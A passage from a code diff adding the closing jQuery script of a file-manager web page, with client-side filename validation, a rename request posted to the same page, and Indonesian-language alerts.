+        if (!validateFileName(newName)) {
+            showAlert("Nama file tidak valid!", 'warning');
+            return;
+        }
+        $.post("", { action: "rename", target: path, new_name: newName }, function (response) {
+            const res = JSON.parse(response);
+            if (res.status === "success") {
+                showAlert(res.message, 'success');
+                $("#renameModal").modal("hide");
+                setTimeout(() => location.reload(), 1500);
+            } else {
+                showAlert(res.message, 'danger');
+            }
+        });
+    });
+
+    // Add loading animation for actions
+    $(document).on('click', '.btn', function() {
+        $(this).addClass('loading');
+        setTimeout(() => $(this).removeClass('loading'), 1000);
+    });
+
+    function validateFileName(name) {
+        const regex = /^[a-zA-Z0-9_\-\.\s]+$/;
+        return regex.test(name);
+    }
+</script>
+</body>
+</html>
